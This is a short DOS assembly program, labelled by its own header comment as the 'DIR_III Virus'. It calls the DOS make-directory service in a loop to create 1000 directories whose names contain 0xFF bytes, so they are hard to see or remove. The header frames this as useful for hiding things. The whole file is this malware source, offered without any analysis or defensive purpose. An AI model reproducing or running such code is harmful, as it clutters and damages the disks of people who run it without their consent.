

; The DIR_III Virus will create 1000 directories on
; the HD. Quite useful for those necessary items
; you wish to keep hidden.

.model  tiny
.code
                org     0100h

begin:          mov     cx,1000d

                push    cx
step_1:
                mov     ah,39h
                mov     dx,offset filename
                int     21h
                jmp     end_look

end_look:       mov     di,offset filename
                mov     bx,7h
incnum:         inc     byte ptr ds:[bx+di]
                cmp     byte ptr ds:[bx+di],'9'
                jbe     numok
                mov     byte ptr ds:[bx+di],'0'
                dec     bx
                jnz     incnum

numok:          pop     cx
                cmp     cx,0
                je      exit
                dec     cx
                push    cx
                jmp     step_1

exit:           int     20h
filename        db      'ÿÿÿÿ3724.ÿÿÿ',0
heap:
                end    begin


